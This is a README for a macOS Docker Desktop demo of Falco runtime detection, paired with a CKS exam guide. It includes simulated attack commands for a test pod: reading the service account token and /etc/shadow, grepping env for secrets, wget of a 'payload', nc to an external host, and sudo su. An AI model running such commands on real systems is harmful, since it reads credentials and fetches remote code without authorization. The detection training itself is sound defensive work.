# Falco + CKS Demo on Docker Desktop (macOS)

This Makefile automates the setup and demonstration of Falco (runtime security) and Certified Kubernetes Security (CKS) concepts on macOS using Docker Desktop.

## Prerequisites

### Required Tools

- **Docker Desktop** for macOS (with Kubernetes enabled)
- **kubectl** - Kubernetes command-line tool
- **helm** - Kubernetes package manager

### Installation

#### 1. Docker Desktop

- Download from: https://www.docker.com/products/docker-desktop
- Enable Kubernetes: Docker Desktop > Preferences > Kubernetes > Enable Kubernetes
- Wait for Kubernetes to be "Running"

#### 2. kubectl

```bash
brew install kubectl
```

#### 3. helm

```bash
brew install helm
```

#### Verify Installation

```bash
docker --version
kubectl version --client
helm version
```

---

## Quick Start

### One-Command Setup

```bash
make setup
```

This will:

1. ✅ Check all required tools (kubectl, helm)
2. ✅ Start Docker Desktop if not running
3. ✅ Wait for Kubernetes to be ready
4. ✅ Install Falco via Helm (modern-ebpf driver)
5. ✅ Create a test/victim pod (busybox)
6. ✅ Wait for all pods to be ready

### Expected Output

```
🔍 Verificando ferramentas...
🐳 Verificando Docker Desktop...
Docker já está rodando.
🛡️  Instalando Falco...
NAME: falco
STATUS: deployed
REVISION: 1
😈 Criando o pod vítima...
pod/victim-pod created
⏳ Aguardando pods ficarem 'Running'...
✅ Setup Concluído!
Para rodar a demo, abra dois terminais e rode:
  make demo-defender (Terminal 1)
  make demo-attacker (Terminal 2)
```

---

## Demo: Running the Security Monitoring

After `make setup` completes successfully, open **two terminal windows**.

### Terminal 1 - Defender (Monitor Falco)

```bash
make demo-defender
```

This will stream Falco logs and show real-time security events detected in the cluster.

**Expected output:**

```
Monitorando logs do Falco... (Pressione Ctrl+C para sair)
<Falco security events in JSON format>
```

### Terminal 2 - Attacker (Simulate Attacks)

```bash
make demo-attacker
```

This drops you into the victim pod shell. Try these (safe, simulated) commands to trigger Falco alerts:

```bash
# Read Kubernetes service account token (suspicious activity)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Create a backdoor file / suspicious executable
touch /etc/iam-a-backdoor
cat > /tmp/suspicious.sh << 'EOF'
#!/bin/sh
echo "malicious"
EOF
chmod +x /tmp/suspicious.sh

# Fetch remote content (simulated payload download)
wget http://example.com/payload -O /tmp/payload 2>&1 | head
curl -sS http://example.com/health || true

# Inspect processes and files
ps aux | head -n 10
find / -name "*.conf" 2>/dev/null | head -5
sh /tmp/suspicious.sh

# Generate simple network activity
ping -c 3 8.8.8.8
```

**Monitor Terminal 1** to see Falco's real-time detections of these suspicious activities!

---

## Available Commands

### Show Help

```bash
make help
```

### Setup & Cleanup

#### Setup Everything

```bash
make setup
```

#### Check Environment

```bash
make check-env
```

#### Check Docker Status

```bash
make check-docker
```

#### Install Falco Only

```bash
make install-falco
```

#### Deploy Victim Pod

```bash
make deploy-victim
```

#### Wait for Pods

```bash
make wait
```

#### Clean Everything

```bash
make clean
```

Removes:

- Victim pod
- Falco Helm release
- Falco namespace
- All related resources

---

## Demo Commands

### Monitor Falco Logs

```bash
make demo-defender
```

### Access Victim Pod

```bash
make demo-attacker
```

---

## Advanced Usage

### Manual Commands

#### Check Falco Status

```bash
kubectl get pods -n falco
kubectl describe pod -n falco -l app.kubernetes.io/name=falco
```

#### Check Victim Pod

```bash
kubectl get pod victim-pod
kubectl describe pod victim-pod
```

#### View Falco Helm Release

```bash
helm list -n falco
helm status falco -n falco
```

#### Stream Falco Logs Manually

```bash
kubectl logs -f -n falco -l app.kubernetes.io/name=falco -c falco
```

#### Execute Commands in Victim Pod

```bash
kubectl exec -it victim-pod -- /bin/sh
```

---

## Falco Commands Reference

Quick reference for all Falco-related commands you'll use during the demo.

### Setup & Installation

```bash
# Install Falco via Helm (using modern-ebpf driver)
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm upgrade --install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --wait
```

### Check Falco Status

```bash
# List Falco pods
kubectl get pods -n falco

# Check if Falco is running
kubectl get pods -n falco -l app.kubernetes.io/name=falco

# Describe Falco pod (useful for troubleshooting)
kubectl describe pod -n falco -l app.kubernetes.io/name=falco

# Check Falco version
kubectl exec -n falco $(kubectl get pod -n falco -o jsonpath='{.items[0].metadata.name}') -- falco --version
```

### Stream Falco Logs

```bash
# Stream all Falco logs (main command for demo)
kubectl logs -f -n falco -l app.kubernetes.io/name=falco

# Stream logs from a specific Falco pod
kubectl logs -f -n falco <falco-pod-name>

# Get last 100 lines of Falco logs
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=100

# Stream logs and filter for specific keywords
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep "shell\|suspicious"

# Get logs from Falco driver loader (if pod fails to start)
kubectl logs -n falco $(kubectl get pod -n falco -o jsonpath='{.items[0].metadata.name}') -c falco-driver-loader
```

### Victim Pod Operations

```bash
# Enter the victim pod interactively
kubectl exec -it victim-pod -- /bin/sh

# Run a single command in the victim pod
kubectl exec victim-pod -- <command>

# Copy files to/from victim pod
kubectl cp /local/path victim-pod:/pod/path
kubectl cp victim-pod:/pod/path /local/path

# Check victim pod logs
kubectl logs victim-pod

# Describe victim pod
kubectl describe pod victim-pod
```

### Attack Simulation Commands

Run these inside the victim pod (after entering with `kubectl exec -it victim-pod -- /bin/sh`):

```bash
# 1. Read Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 2. Create suspicious files
touch /etc/iam-a-backdoor
echo "malicious code here" > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh

# 3. Fetch remote content (simulated)
wget -q -O /tmp/payload http://example.com
curl -sS http://example.com/health || true

# 4. Inspect system information
ps aux | head -n 10
find / -name "*.conf" 2>/dev/null | head -n 5

# 5. Generate network activity
ping -c 3 8.8.8.8
nc -zv example.com 80

# 6. Access sensitive files
cat /etc/passwd
cat /etc/shadow 2>/dev/null || echo "Permission denied"

# 7. View environment variables
env | grep -i secret
```

### Automated Demo Script

```bash
# Copy the prepared demo script to the victim pod
kubectl cp ./scripts/demo_attacker.sh default/victim-pod:/tmp/demo_attacker.sh

# Make it executable
kubectl exec victim-pod -- chmod +x /tmp/demo_attacker.sh

# Run the automated demo script
kubectl exec victim-pod -- /bin/sh /tmp/demo_attacker.sh

# Check the steps that were executed
kubectl exec victim-pod -- cat /tmp/demo_steps.txt
```

### Helm Operations

```bash
# List installed Helm releases in falco namespace
helm list -n falco

# Check Falco release status
helm status falco -n falco

# Get values used in Falco installation
helm get values falco -n falco

# Upgrade Falco (e.g., to a newer version)
helm upgrade falco falcosecurity/falco -n falco

# Uninstall Falco
helm uninstall falco -n falco
```

### Namespace Operations

```bash
# List all resources in the falco namespace
kubectl get all -n falco

# Delete the entire falco namespace
kubectl delete namespace falco

# Get namespace events (useful for debugging)
kubectl get events -n falco
```

### Cleaning Up

```bash
# Remove just the victim pod
kubectl delete pod victim-pod

# Remove Falco Helm release
helm uninstall falco -n falco

# Remove the falco namespace entirely
kubectl delete namespace falco

# Full cleanup with one command
make clean
```

---

## Troubleshooting

### Docker Desktop Not Running

```bash
# Manually start Docker Desktop
open -a Docker
```

### Kubernetes Not Ready

```bash
# Check cluster status
kubectl cluster-info
kubectl get nodes
```

### Falco Pod Not Starting

```bash
# Check logs
kubectl logs -n falco $(kubectl get pod -n falco -o name) -c falco-driver-loader

# Describe the pod
kubectl describe pod -n falco -l app.kubernetes.io/name=falco
```

### Permission Denied Errors

```bash
# Ensure you have proper kubectl permissions
kubectl auth can-i create deployments --namespace default
```

### Port Already in Use

If you get port conflicts, clean up and restart:

```bash
make clean
sleep 5
make setup
```

---

## Architecture

### Components

1. **Falco** - Runtime security monitoring

   - Deployed as a DaemonSet (one pod per node)
   - Uses `modern-ebpf` driver for efficient system call capture
   - Monitors syscalls and detects suspicious behavior
2. **Victim Pod** - Test target

   - Simple busybox image
   - Used to simulate and test security scenarios
   - Intentionally left open for demonstration
3. **Docker Desktop Kubernetes** - Container orchestration

   - Single-node cluster (perfect for local demos)
   - Built-in Kubernetes in Docker Desktop
   - Uses linux/amd64 architecture

---

## What is Falco?

Falco is a behavioral activity monitor designed to detect and alert on:

- Unauthorized process execution
- Unauthorized file access/modification
- Unauthorized network connections
- Privilege escalation attempts
- Suspicious system calls

### Key Features

- Real-time threat detection
- Minimal performance overhead
- Customizable rules
- Multiple output channels (Slack, Kafka, Syslog, etc.)

Learn more: https://falco.org

---

## What is CKS?

CKS (Certified Kubernetes Security) is a Linux Foundation certification covering:

- Cluster setup and hardening
- Microservices security
- Supply chain security
- Runtime security
- RBAC (Role-Based Access Control)
- Network policies
- Pod security standards

This demo focuses on **Runtime Security** - detecting suspicious behavior at runtime.

---

## Project Structure

```
/
├── Makefile           # Automation scripts for demo
├── README.md          # This file
└── slide_*.html       # Presentation slides
```

---

## Tips for the Demo

1. **Have two terminals open** side-by-side
2. **Start `make demo-defender` first** before running attacks
3. **Slowly execute commands** so audience can see real-time detection
4. **Explain each Falco alert** as it appears
5. **Use the slides** to explain CKS concepts between demonstrations

---

## Performance Notes

- Falco uses **modern-ebpf** driver (no kernel compilation needed on Docker Desktop)
- Minimal overhead (~1-2% CPU per node)
- Instant detection of policy violations
- No recompilation between runs

---

## Common Falco Alerts

### File Modification Detection

```
Write below etc
Modify a file below etc
```

### Unauthorized Process Execution

```
Unauthorized process
Suspicious shell history
```

### Network Anomalies

```
Unauthorized network connections
Suspicious DNS queries
```

### Privilege Escalation

```
Privilege escalation detected
Unauthorized sudo execution
```

---

## Additional Resources

- **Falco Documentation**: https://falco.org/docs/
- **Falco Rules**: https://github.com/falcosecurity/rules
- **Kubernetes Security**: https://kubernetes.io/docs/concepts/security/
- **CKS Exam**: https://www.linux.com/training/certification/cks-certified-kubernetes-security-specialist/

---

## CKS Exam Guide: Falco Runtime Security

The Certified Kubernetes Security (CKS) exam heavily emphasizes **Runtime Security** and **Behavioral Monitoring**. Falco is a key tool for detecting and responding to security threats at runtime.

### What You Need to Know for CKS

#### 1. Falco Core Concepts

**Falco** is a behavioral activity monitor that:

- Monitors system calls (syscalls) at the kernel level
- Detects suspicious activities in containers and pods
- Generates real-time security alerts based on rules
- Works across all container runtimes (Docker, containerd, CRI-O)
- Requires minimal performance overhead

**Key Advantage**: Falco detects behavior, not just known signatures. This means it can catch zero-day exploits and unknown malware.

#### 2. Falco Architecture

```
┌─────────────────────────────────────────┐
│     Kubernetes Cluster (Docker)         │
├─────────────────────────────────────────┤
│  ┌─────────────┐  ┌─────────────┐      │
│  │   Falco     │  │   Falco     │ ... │
│  │   Pod 1     │  │   Pod 2     │      │
│  │ (Node 1)    │  │ (Node 2)    │      │
│  └────┬────────┘  └────┬────────┘      │
│       │                │                │
│  System Calls (eBPF/modern-ebpf driver) │
│       │                │                │
└─────────────────────────────────────────┘
         │
    ┌────▼─────────────────┐
    │  Falco Rules Engine  │
    │ (Matches behaviors)  │
    └────┬────────────────┘
         │
    ┌────▼──────────────────┐
    │  Alerts & Outputs     │
    │ (Logs, Slack, etc)    │
    └──────────────────────┘
```

#### 3. How Falco Works

1. **Capture**: Modern-eBPF driver captures system calls
2. **Match**: Compare syscalls against Falco rule conditions
3. **Alert**: Generate alert when rule matches
4. **Output**: Send alert to logs, stdout, or external systems

#### 4. Installing Falco (CKS Exam Scenario)

You may be asked to install Falco in a Kubernetes cluster:

```bash
# Add Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco with modern-ebpf driver (recommended for Docker Desktop/local clusters)
helm upgrade --install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --wait

# Verify Falco is running
kubectl get pods -n falco
kubectl get daemonset -n falco
```

#### 5. Falco Configuration (CKS Focus)

Key configuration file: `/etc/falco/falco.yaml`

Important settings:

```yaml
# Enable/disable rule categories
rules_file:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/falco_rules.local.yaml

# Output format
output_format: "json"  # or "text"

# Buffering
syscall_event_drops:
  threshold: 0.1       # Alert if >10% syscalls are dropped
  actions:
    - alert

# Buffer sizing
syscall_buf_size_preset: 4  # Adjust based on workload
```

#### 6. Common CKS Exam Scenarios with Falco

**Scenario A: Detect Unauthorized Shell Access**

```bash
# Attacker tries to access a container shell
kubectl exec -it vulnerable-pod -- /bin/bash

# Falco detects this and alerts:
# Alert: "A shell was spawned in a container with an attached terminal"
```

**Scenario B: Detect Suspicious File Creation**

```bash
# Inside pod - create suspicious file
touch /etc/malicious-config
echo "backdoor" > /tmp/backdoor.sh

# Falco alerts:
# Alert: "Write below etc"
# Alert: "Suspicious shell history"
```

**Scenario C: Detect Unauthorized Network Connections**

```bash
# Inside pod - connect to external host
nc -zv suspicious-host.com 443

# Falco alerts:
# Alert: "Outbound connection to suspicious IP"
```

**Scenario D: Detect Privilege Escalation**

```bash
# Inside pod - try to escalate privileges
sudo su
id

# Falco alerts:
# Alert: "Unauthorized sudo execution"
# Alert: "Privilege escalation detected"
```

### Essential Bash Commands for CKS Exam

#### Installing and Managing Falco

```bash
# Install Falco via Helm (most common)
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco -n falco --create-namespace

# Check Falco deployment status
kubectl get daemonset -n falco
kubectl get pods -n falco

# Check Falco pod logs
kubectl logs -f -n falco -l app.kubernetes.io/name=falco

# Describe Falco pod (for troubleshooting)
kubectl describe pod -n falco <pod-name>
```

#### Viewing Falco Alerts

```bash
# Stream all Falco alerts in real-time
kubectl logs -f -n falco -l app.kubernetes.io/name=falco

# Get last 50 lines of alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50

# Filter alerts for specific keywords (e.g., "shell", "privileged")
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep -i "shell\|privileged"

# Get JSON-formatted alerts (easier to parse)
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco | tail -n 1 | jq '.'
```

#### Interacting with Test Pods

```bash
# Run a test pod (similar to CKS exam scenarios)
kubectl run test-pod --image=busybox -- sleep 3600

# Enter the pod interactively
kubectl exec -it test-pod -- /bin/sh

# Execute a single command in the pod
kubectl exec test-pod -- whoami

# Copy files to/from the pod
kubectl cp ./file.txt test-pod:/tmp/file.txt
kubectl cp test-pod:/etc/passwd ./passwd-backup.txt
```

#### Troubleshooting Falco

```bash
# Check if Falco driver is loaded
kubectl exec -n falco <pod-name> -- lsmod | grep falco

# Check Falco initialization logs
kubectl logs -n falco <pod-name> -c falco-driver-loader

# View Falco configuration
kubectl exec -n falco <pod-name> -- cat /etc/falco/falco.yaml

# Validate Falco rules syntax
kubectl exec -n falco <pod-name> -- falco -c /etc/falco/falco.yaml -L

# Dry-run Falco rules (test without executing)
kubectl exec -n falco <pod-name> -- falco -T
```

#### Advanced CKS Scenarios

```bash
# Monitor all pod executions
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep "execve"

# Monitor all file writes to sensitive directories
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep "Write below"

# Monitor all network connections
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep "connect\|Network"

# Monitor privilege escalation attempts
kubectl logs -f -n falco -l app.kubernetes.io/name=falco | grep -i "privilege\|sudo"

# Export alerts to JSON for analysis
kubectl logs -n falco -l app.kubernetes.io/name=falco > alerts.json
```

### CKS Exam Tips

1. **Know how to install Falco**: Use Helm with `modern_ebpf` driver
2. **Understand what Falco detects**: Syscalls, file modifications, network activity, privilege escalation
3. **Practice streaming logs**: Know how to view real-time alerts with `kubectl logs -f`
4. **Recognize common alerts**: Study which behaviors trigger which Falco rules
5. **Be ready to interpret alerts**: Understand what each alert means and what vulnerability it indicates
6. **Know how to troubleshoot**: If Falco doesn't alert, check logs and driver status
7. **Practice scenarios**: Run simulated attacks and see what Falco detects

### Sample CKS Exam Question

**Question**: You need to detect unauthorized shell access to a pod. What Falco rule would trigger this?

**Answer**:

```
Rule: "A shell was spawned in a container with an attached terminal"
This rule detects when a user executes an interactive shell in a container,
which is a suspicious activity that should be monitored or denied.

To implement:
1. Install Falco with: helm install falco falcosecurity/falco -n falco
2. View alerts with: kubectl logs -f -n falco -l app.kubernetes.io/name=falco
3. Attempt access: kubectl exec -it pod-name -- /bin/bash
4. See Falco alert immediately
```

### Related CKS Topics

- **Pod Security Standards**: Control which containers can run privileged code
- **Network Policies**: Restrict network traffic (complementary to Falco)
- **RBAC**: Control who can access resources (different from runtime monitoring)
- **AppArmor/SELinux**: Kernel-level enforcement (works alongside Falco)
- **Audit Logging**: Kubernetes API audit trails (different from Falco syscall monitoring)

**Key Difference**: Falco monitors **runtime behavior** inside containers, while RBAC/NetworkPolicy/PSS prevent access at the **API/network level**.

---

## Cleanup

To remove everything and return to a clean state:

```bash
make clean
```

This safely removes all demo resources without affecting other cluster configurations.

---

## Support

For issues or improvements, please check:

- Falco: https://github.com/falcosecurity/falco
- Kubernetes: https://kubernetes.io/docs/
- Docker Desktop: https://docs.docker.com/desktop/

---

**Last Updated**: November 26, 2025
**Version**: 1.0

